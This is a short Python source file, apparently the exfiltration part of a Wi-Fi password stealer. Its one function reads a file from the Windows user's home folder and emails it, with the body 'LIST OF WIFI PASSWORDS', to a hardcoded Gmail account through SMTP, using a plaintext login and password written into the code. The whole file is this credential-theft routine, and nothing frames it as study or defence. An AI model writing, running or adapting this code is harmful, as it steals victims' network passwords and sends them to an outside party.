import os
import smtplib 
from email.message import EmailMessage 


def send_to_gmail(file):
    msg = EmailMessage()
    msg['Subject'] = 'Here you go'
    msg['From'] = 'OSINT48@gmail.com'
    msg['To'] = 'OSINT48@gmail.com'
    msg.set_content('LIST OF WIFI PASSWORDS')

    with open(('C:\\Users\\' + os.environ['USERNAME'] + f'\\{file}'), 'rb') as f:
        file_data = f.read()
        file_name = f.name

    msg.add_attachment(file_data, maintype='application', subtype='octet-stream', filename=file_name)

    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
        smtp.login('OSINT48@gmail.com', 'anticheat465')
        smtp.send_message(msg)
